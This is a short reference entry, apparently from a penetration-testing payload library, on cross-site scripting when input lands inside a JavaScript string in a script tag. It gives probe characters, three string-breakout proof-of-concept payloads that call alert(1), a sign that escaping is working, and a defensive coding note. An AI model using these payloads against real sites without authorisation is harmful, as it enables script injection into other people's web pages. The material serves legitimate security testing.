---
Version: v0.1
Updated: 2025-09-11T08:13:40.198035Z
File: vulnerabilities/xss/payloads/split/5_javascript_string_context_inside_script_as_a_string.md
Vulnerability: XSS
Category: Payload
---
## 5) **JavaScript string** context (inside `<script>` as a string)
Example: `<script>var msg = "<HERE>";</script>`

- **Probe:** `"` or `\` → should be escaped (`\"`, `\\`).
- **PoC:** `";alert(1);//`
- **PoC (single-quoted):** `';alert(1);//`
- **PoC (template literal):** `` `";${alert(1)}` ``
- **Safe tell:** Quotes and backslashes are escaped; no string break occurs.

**Notes:** Prefer JSON-in-script patterns and parse at runtime; still escape all special chars.

---